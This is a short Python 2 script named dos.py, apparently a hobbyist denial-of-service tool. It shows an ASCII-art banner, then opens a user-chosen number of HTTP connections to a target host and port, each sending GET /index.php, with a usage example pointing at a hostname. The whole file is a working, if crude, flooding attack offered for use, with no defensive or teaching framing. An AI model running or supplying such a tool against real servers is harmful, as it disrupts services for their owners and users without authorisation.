import argparse
import httplib
import time
import sys

import os
from progress.bar import Bar


def banner():
    print ('''
**************************************************************************************************************************    
*.----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  *
*| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |*
*| | ____    ____ | || |     _____    | || |  ___  ____   | || |  _________   | || |   _____      | || |      __      | |*
*| ||_   \  /   _|| || |    |_   _|   | || | |_  ||_  _|  | || | |_   ___  |  | || |  |_   _|     | || |     /  \     | |*
*| |  |   \/   |  | || |      | |     | || |   | |_/ /    | || |   | |_  \_|  | || |    | |       | || |    / /\ \    | |*
*| |  | |\  /| |  | || |      | |     | || |   |  __'.    | || |   |  _|  _   | || |    | |   _   | || |   / ____ \   | |*
*| | _| |_\/_| |_ | || |     _| |_    | || |  _| |  \ \_  | || |  _| |___/ |  | || |   _| |__/ |  | || | _/ /    \ \_ | |*
*| ||_____||_____|| || |    |_____|   | || | |____||____| | || | |_________|  | || |  |________|  | || ||____|  |____|| |*
*| |              | || |              | || |              | || |              | || |              | || |              | |*
*| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |*
*'----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' |*''')
    time.sleep(1)
    print ('''
*                                                                               BY: ElaSec | Mikili                      *
**************************************************************************************************************************
 ''')


def setconnect(t, p, n):
    bar = Bar('Sending request', max=int(n))
    for i in range(1, int(n)):
        httpconnection = httplib.HTTPConnection(t, p)
        httpconnection.request("GET", "/index.php")
        bar.next()
    else:
        print('\r\n -------- send {0} request to target {1} with port {2}-------- '.format(n, t, p))
        bar.finish()


def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


if __name__ == "__main__":
    clear()
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target")
    parser.add_argument("-n", "--count")
    parser.add_argument("-p", "--port")
    args = parser.parse_args()
    if not args.target or not args.count:
        print (' ')
        print('  Usage: ./dos.py [options]')
        print(' ')
        print('  Options: -t, --target    <hostname>   |   Target')
        print('           -n, --count     <connection times> |   Counts')
        print ('           -p, --port     <port> |   Pounts')
        print(' ')

        print('  Example: ./dos.py -t www.test.com -n 100 ')
        sys.exit(0)
    banner()
    target = args.target
    count = args.count
    port = args.port
    setconnect(target, port, count)
